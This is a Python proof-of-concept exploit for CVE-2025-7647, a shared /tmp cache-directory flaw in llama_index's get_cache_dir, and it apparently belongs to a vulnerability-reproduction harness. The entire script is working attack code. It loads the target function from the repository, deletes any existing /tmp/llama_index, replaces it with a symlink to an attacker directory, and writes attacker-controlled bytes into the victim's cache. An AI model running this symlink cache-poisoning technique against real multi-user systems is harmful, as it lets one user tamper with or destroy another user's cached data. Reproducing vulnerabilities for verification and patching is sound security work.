#!/usr/bin/env python3
"""Shared /tmp cache-dir PoC for llama_index.core.utils.get_cache_dir (CVE-2025-7647)."""
# IRIDIUM_SUBPROCESS_ISOLATED_POC
from __future__ import annotations

import os
import subprocess
import sys
import textwrap

REPO = os.environ.get('IRIDIUM_REPO_PATH', '/workspace')
CORE = os.path.join(REPO, "llama-index-core")
TARGET_RELPATH = "llama-index-core/llama_index/core/utils.py"

_CHILD = textwrap.dedent(
    """import ast
import os
import sys
import shutil
from pathlib import Path

PROOF = "/tmp/iridium_proof"
core = os.environ["IRIDIUM_LLAMA_CORE"]
target_relpath = os.environ.get("IRIDIUM_TARGET_RELPATH", "llama-index-core/llama_index/core/utils.py")
utils_path = os.path.join(core, "llama_index", "core", "utils.py")
if not os.path.isfile(utils_path):
    raise SystemExit(f"PROOF FAILED: target missing: {target_relpath}")
source = Path(utils_path).read_text(encoding="utf-8")
tree = ast.parse(source)
get_cache_dir = None
for node in tree.body:
    if isinstance(node, ast.FunctionDef) and node.name == "get_cache_dir":
        segment = ast.get_source_segment(source, node)
        if not segment:
            raise SystemExit("PROOF FAILED: unable to extract get_cache_dir")
        namespace = {"os": os, "sys": sys, "Path": Path}
        exec(segment, namespace)
        get_cache_dir = namespace["get_cache_dir"]
        break
if get_cache_dir is None:
    raise SystemExit("PROOF FAILED: get_cache_dir not found in utils.py")

predicted = "/tmp/llama_index"
attacker_dir = "/tmp/iridium_llama_index_attacker"
os.makedirs(attacker_dir, exist_ok=True)
marker = os.path.join(attacker_dir, "iridium_cache_poison.txt")
attacker_bytes = b"ATTACKER_CONTROLLED_CACHE"

if os.path.lexists(predicted):
    if os.path.islink(predicted):
        os.unlink(predicted)
    elif os.path.isdir(predicted):
        shutil.rmtree(predicted)
    else:
        os.unlink(predicted)

os.symlink(attacker_dir, predicted)

returned = get_cache_dir()
if returned != predicted:
    raise SystemExit(f"PROOF FAILED: unexpected cache dir {returned!r}")

with open(os.path.join(returned, "iridium_cache_poison.txt"), "wb") as cache_file:
    cache_file.write(attacker_bytes)

with open(marker, "rb") as handle:
    if handle.read() != attacker_bytes:
        raise SystemExit("PROOF FAILED: symlinked cache dir did not accept attacker write")

with open(PROOF, "wb") as proof_file:
    proof_file.write(attacker_bytes)
print("IRIDIUM_PROOF_CREATED")
"""
)


def main() -> None:
    env = dict(os.environ)
    env["IRIDIUM_LLAMA_CORE"] = CORE
    env["IRIDIUM_TARGET_RELPATH"] = TARGET_RELPATH
    proc = subprocess.run(
        [sys.executable, "-c", _CHILD],
        env=env,
        capture_output=True,
        text=True,
    )
    if proc.stdout:
        sys.stdout.write(proc.stdout)
    if proc.stderr:
        sys.stderr.write(proc.stderr)
    raise SystemExit(proc.returncode)


if __name__ == "__main__":
    main()
